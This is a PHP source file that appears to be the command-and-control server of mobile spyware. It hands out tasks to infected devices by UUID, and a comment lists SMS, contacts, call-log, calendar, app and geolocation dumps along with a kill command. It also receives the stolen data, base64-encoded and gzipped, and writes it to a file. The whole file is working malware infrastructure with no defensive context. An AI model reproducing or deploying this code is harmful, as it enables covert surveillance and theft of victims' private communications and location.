<?php

if ($_SERVER["REQUEST_METHOD"] == "GET") {
	if (isset($_GET["uuid"]) && !empty($_GET["uuid"])) {
		$id = sanitize($_GET["uuid"]);
		if (preg_match("/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i", $id)) {
			// Available: kill, smsDump, contactsDump, callsDump, getGeoLocation, appsDump, deviceInfo, calendarsDump
			$json = [ 'uuid' => $id, 'task' => 'smsDump' ];
			header('Content-type:application/json;charset=utf-8');
			echo json_encode($json);
		}
		else {
			echo "Incorrect UUID format";
		}
	}
	else {
		echo "UUID not set";
	}
}
else if ($_SERVER["REQUEST_METHOD"] == "POST") {
	if (!isset($_POST['task']) || !isset($_POST['uuid']) || !isset($_POST['data'])) {
		die("Incorrect POST parameters");
	}

	$id = sanitize($_POST['uuid']);
	$task = sanitize($_POST['task']);
	$data = $_POST['data'];

	if (empty($id) || empty($task) || empty($data)) {
		die("Parameters cannot be empty");
	}

	$data = rawurldecode($data);
	$data = base64_decode($data);
	$data = gzdecode($data);

	file_put_contents('output.txt', $data);
}

function sanitize($data)
{
	$data = trim($data);
	$data = stripslashes($data);
	$data = htmlspecialchars($data);
	return $data;
}

?>